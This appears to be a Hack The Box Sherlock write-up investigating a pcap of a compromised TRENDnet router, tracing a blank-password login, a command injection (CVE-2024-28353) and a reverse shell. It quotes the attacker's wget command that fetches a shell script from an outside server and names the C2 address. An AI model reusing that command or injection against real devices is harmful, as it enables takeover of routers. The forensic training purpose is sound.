+++
date = '2026-02-14T00:00:00+01:00'
draft = false
title = 'Trent Sherlock a Hack The Box Writeup'
+++

This writeup documents my analysis and investigation of the [**Trent**](https://app.hackthebox.com/sherlocks/Trent) sherlock on Hackthebox. The challenge involves the analysis of a compromised router. Where the attacker gained unauthorized access to the router’s web administration interface, exploited a known vulnerability to achieve remote code execution (RCE), and ultimately established a reverse shell connection to an external command-and-control server.

We are provided with a trent.pcap file that includes communication between the attacker and the compromised router.

Let’s get into it…

> *From what IP address did the attacker initially launched their activity?*


After filtering for HTTP traffic in Wireshark, Assuming the router’s web interface was at “192.168.10.1”, the only internal host interacting with the router was ***192.168.10.2***


![](/images/htb-trent-sc1.png)

> ***What is the model name of the compromised router?***
> 

By filtering for HTTP traffic between the attacker `192.168.10.2`and the router`192.168.10.1` I noticed the following request “GET /login_pic.asp”.



![](/images/htb-trent-sc2.png)

following the HTTP stream and inspecting the response. We get the answer

***TEW-827DRU***



![](/images/htb-trent-sc3.png)

> *How many failed login attempts did the attacker try before successfully logging into the router?*
> 

Filtering for POST requests using the following filter.

***ip.addr==192.168.10.2 && ip.addr==192.168.10.1 and http.request.method == “POST”***



![](/images/htb-trent-sc4.png)

I identified this as the login request based on the POST body. There was a total of 3 similar requests sent. And after the third there was a lot of resources related to the admin panel being fetched, Indicating successful login. The answer here is ***2.***

> *At what UTC time did the attacker successfully log into the routers web admin interface?*
> 

The third succsessful login request was sent at ***2024–05–01 15:53:27.***



![](/images/htb-trent-sc5.png)

> *How many characters long was the password used to log in successfully?*
> 

Looking at the request body “log_pass“ was set to an empty string so the answer here is ***0.***



![](/images/htb-trent-sc6.png)

> *What is the current firmware version installed on the compromised router?*
> 

This took a lot of time to figure out, After searching manually for the string “firmware“ in the response of various requests. I resorted to using tcpdump and grep to search for any format firmware version would be represented as, as well as the flag format.



![](/images/htb-trent-sc7.png)

which yeilded the answer ***2.10.***

> *Which HTTP parameter was manipulated by the attacker to get remote code execution on the system?*
> 

Inspecting the HTTP POST requests sent by the malicious user, i noticed this request and the “whoami” here stood out. the answer is ***usbapps.config.smb_admin_name***

![](/images/htb-trent-sc8.png)

> *What is the CVE number associated with the vulnerability that was exploited in this attack?*
> 

Searching for CVE’s related to TEW-827DRU with firmware version 2.10 i found [CVE-2024-28353](https://nvd.nist.gov/vuln/detail/CVE-2024-28353) .

### **“T*here is a command injection vulnerability in the TRENDnet TEW-827DRU router with firmware version 2.10B01. An attacker can inject commands into the post request parameters usapps.config.smb_admin_name in the apply.cgi interface, thereby gaining root shell privileges.”***

This explains the earlier request, Eitherway the answer here is ***CVE-2024–28353.***

> *What was the first command the attacker executed by exploiting the vulnerability?*
> 

Remmber the weird packet? ***whoami*** happens to be the first command the attacker executes.

> *What command did the actor use to initiate the download of a reverse shell to the router from a host outside the network?*
> 

Looking at other HTTP requests sent to apply.cgi, I noticed this request where the attacker used **wget** to download a shell script from a server he controls. The answer here is ***wget [http://35.159.25.253:8000/a1l4m.sh](http://35.159.25.253:8000/a1l4m.sh%E2%80%9D)***



![](/images/htb-trent-sc9.png)

> *Multiple attempts to download the reverse shell from an external IP failed. When the actor made a typo in the injection, what response message did the server return?*
> 

In one injection attempt, the attacker omitted a backtick `, causing command failure.



![](/images/htb-trent-sc10.png)

Following the TCP stream we can see the router replied with ***Access to this resource is forbidden***

![](/images/htb-trent-sc11.png)

> *What was the IP address and port number of the command and control (C2) server when the actor’s reverse shell eventually did connect? (IP:Port)*
> 

Filtering for retrieval of the shell script using the following filter.

```
http contains "a1l4m.sh" && http.request.method == "GET"
```



![](/images/htb-trent-sc12.png)

We find the GET request for the shell script, Following the TCP stream we obtain the script contents. Which attempts a reverse shell connection to ***35.159.25.253:41143***



![](/images/htb-trent-sc13.png)

# **Conclusion**

This was a good challenge, it honed my WireShark skills further and was overall fun to play.



![](/images/htb-trent-sc14.png)